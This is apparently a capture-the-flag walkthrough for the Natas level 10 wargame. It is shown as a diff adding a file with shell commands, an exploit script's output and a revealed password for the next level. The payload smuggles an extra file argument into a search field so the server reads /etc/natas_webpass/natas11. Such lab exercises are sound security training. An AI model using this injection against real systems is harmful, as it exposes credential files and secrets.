@@ -1,0 +1,24 @@
+# work.
+
+user@localhost:~$ echo "q /etc/natas_webpass/natas11" > natas10_payload
+user@localhost:~$ python3 exploit.py < natas10_payload
+
+# output.
+
+[*] Page forms: 
+[<form>
+Find words containing: <input name="needle"/><input name="submit" type="submit" value="Search"/><br/><br/>
+</form>]
+
+Enter the value of the field 'needle' (type: text): q /etc/natas_webpass/natas11
+
+[*] Sending html response to 'response.txt'
+[*] Done.
+
+
+----------------------------------------
+Finally, open the 'response.txt' file that has been created with an editor of 
+your preference in order to view the password for the next level.
+----------------------------------------
+The password for natas11 is U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
